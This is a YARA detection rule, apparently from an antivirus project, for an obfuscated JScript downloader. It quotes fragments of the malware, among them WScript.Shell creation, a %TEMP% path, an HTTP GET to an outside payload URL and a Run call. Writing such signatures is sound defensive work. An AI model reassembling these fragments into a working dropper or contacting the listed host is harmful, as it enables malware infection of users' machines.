rule sig_20160427_ae3c336c2e5c143820c06c2ddbe9ba5e {
  meta:
    description = "datamaliciousorder - file 20160427_ae3c336c2e5c143820c06c2ddbe9ba5e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3f7abdca6ae9bf5273763348d4e444f685abc7fdc92f20206e3c5f0afe298f79"

  strings:
    $s1  = "function CwdsaIgqes() {return MpjzfQdnbc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7BNLmjv" ascii
    $s2  = "function CwdsaIgqes() {return MpjzfQdnbc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7BNLmjv" ascii
    $s3  = "function WwzglMzpfy(JjmooNbqpp, YucixTchsu){PzoqsVlsco = PzoqsVlsco * 1; return JjmooNbqpp - YucixTchsu;};" fullword ascii
    $s4  = "EwtagRrxwx[QhnhjEgptw](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s5  = "var FajbsLjztd = this[\"WScript\"];" fullword ascii
    $s6  = "var MpjzfQdnbc = function KkgpvMwfqi() {return FajbsLjztd[CasjuAffsx](\"WScript\"+\".Shell\");}(), AgoqmPsvwk = 11;" fullword ascii
    $s7  = "if (EwtagRrxwx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function LyvkyTdudo(){return DxtwrPhrld + \"\";};" fullword ascii
    $s9  = "function ZrzwwEgagc() {return ((SeiruMromg == true) && (SeiruMromg == YqhhySjrow)) ? 1 : PzoqsVlsco;};" fullword ascii
    $s10 = "function FhuyeHjctr(WjrrdMvmpi){MpjzfQdnbc[\"R\"+\"un\"](WjrrdMvmpi, PzoqsVlsco, PzoqsVlsco);};" fullword ascii
    $s11 = "function UlzjgFlyyt()" fullword ascii
    $s12 = "var TnjibOyoxv = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "function EfarmEatrx(){return 23;};" fullword ascii
    $s14 = "var YqhhySjrow = false;" fullword ascii
    $s15 = "SeiruMromg = true; " fullword ascii
    $s16 = "var HwlfuGtudh = false;" fullword ascii
    $s17 = "HwlfuGtudh = true;" fullword ascii
    $s18 = "YqhhySjrow = true; " fullword ascii
    $s19 = "}while (CrnteYhpea);" fullword ascii
    $s20 = "function TrekiMygxe(VccywBasfj) {var MhxfmLgcvt = (1, 2, 3, 4, 5, VccywBasfj); return MhxfmLgcvt;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}